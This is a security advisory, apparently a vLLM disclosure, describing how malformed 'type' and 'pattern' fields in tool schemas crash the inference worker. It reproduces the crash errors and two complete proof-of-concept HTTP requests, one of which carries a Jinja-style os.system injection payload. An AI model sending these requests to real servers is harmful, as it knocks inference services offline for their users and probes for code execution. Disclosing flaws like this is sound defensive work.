summary: "vLLM Tool Schema allows DoS via Malformed pattern and type Fields\n### Summary\nThe\
  \ vLLM backend used with the /v1/chat/completions OpenAPI endpoint fails to validate unexpected\
  \ or malformed input in the \"pattern\" and \"type\" fields when the tools functionality is\
  \ invoked. These inputs are not validated before being compiled or parsed, causing a crash\
  \ of the inference worker with a single request. The worker will remain down until it is restarted.\
  \ \n\n### Details\nThe \"type\" field is expected to be one of: \"string\", \"number\", \"\
  object\", \"boolean\", \"array\", or \"null\". Supplying any other value will cause the worker\
  \ to crash with the following error:\n\nRuntimeError: [11:03:34] /project/cpp/json_schema_converter.cc:637:\
  \ Unsupported type \"something_or_nothing\"\n\nThe \"pattern\" field undergoes Jinja2 rendering\
  \ (I think) prior to being passed unsafely into the native regex compiler without validation\
  \ or escaping. This allows malformed expressions to reach the underlying C++ regex engine,\
  \ resulting in fatal errors.\n\nFor example, the following inputs will crash the worker:\n\
  \nUnclosed {, [, or (\n\nClosed:{} and []\n\nHere are some of runtime errors on the crash\
  \ depending on what gets injected:\n\nRuntimeError: [12:05:04] /project/cpp/regex_converter.cc:73:\
  \ Regex parsing error at position 4: The parenthesis is not closed.\nRuntimeError: [10:52:27]\
  \ /project/cpp/regex_converter.cc:73: Regex parsing error at position 2: Invalid repetition\
  \ count.\nRuntimeError: [12:07:18] /project/cpp/regex_converter.cc:73: Regex parsing error\
  \ at position 6: Two consecutive repetition modifiers are not allowed.\n\n### PoC\nHere is\
  \ the POST request using the type field to crash the worker. Note the type field is set to\
  \ \"something\" rather than the expected types it is looking for:\nPOST /v1/chat/completions\
  \ HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101\
  \ Firefox/138.0\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding:\
  \ gzip, deflate, br\nReferer: \nContent-Type: application/json\nContent-Length: 579\nOrigin:\
  \ \nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nPriority: u=0\n\
  Te: trailers\nConnection: keep-alive\n\n{\n  \"model\": \"mistral-nemo-instruct\",\n  \"messages\"\
  : [{ \"role\": \"user\", \"content\": \"crash via type\" }],\n  \"tools\": [\n    {\n    \
  \  \"type\": \"function\",\n      \"function\": {\n        \"name\": \"crash01\",\n      \
  \  \"parameters\": {\n          \"type\": \"object\",\n          \"properties\": {\n     \
  \       \"a\": {\n              \"type\": \"something\"\n            }\n          }\n    \
  \    }\n      }\n    }\n  ],\n  \"tool_choice\": {\n    \"type\": \"function\",\n    \"function\"\
  : {\n      \"name\": \"crash01\",\n      \"arguments\": { \"a\": \"test\" }\n    }\n  },\n\
  \  \"stream\": false,\n  \"max_tokens\": 1\n}\n\nHere is the POST request using the pattern\
  \ field to crash the worker. Note the pattern field is set to a RCE payload, it could have\
  \ just been set to {{}}. I was not able to get RCE in my testing, but is does crash the worker.\n\
  \nPOST /v1/chat/completions HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;\
  \ x64; rv:138.0) Gecko/20100101 Firefox/138.0\nAccept: application/json\nAccept-Language:\
  \ en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: \nContent-Type: application/json\n\
  Content-Length: 718\nOrigin: \nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site:\
  \ same-origin\nPriority: u=0\nTe: trailers\nConnection: keep-alive\n\n{\n  \"model\": \"mistral-nemo-instruct\"\
  ,\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": \"Crash via Pattern\"\
  \n    }\n  ],\n  \"tools\": [\n    {\n      \"type\": \"function\",\n      \"function\": {\n\
  \        \"name\": \"crash02\",\n        \"parameters\": {\n          \"type\": \"object\"\
  ,\n          \"properties\": {\n            \"a\": {\n              \"type\": \"string\",\n\
  \"pattern\": \"{{ __import__('os').system('echo RCE_OK > /tmp/pwned') or 'SAFE' }}\"\n   \
  \         }\n          }\n        }\n      }\n    }\n  ],\n  \"tool_choice\": {\n    \"type\"\
  : \"function\",\n    \"function\": {\n      \"name\": \"crash02\"\n    }\n  },\n  \"stream\"\
  : false,\n  \"max_tokens\": 32,\n  \"temperature\": 0.2,\n  \"top_p\": 1,\n  \"n\": 1\n}\n\
  \n### Impact\nBackend workers can be crashed causing anyone to using the inference engine\
  \ to get 500 internal server errors on subsequent requests. \n\n### Fix\n\n* https://github.com/vllm-project/vllm/pull/18454"
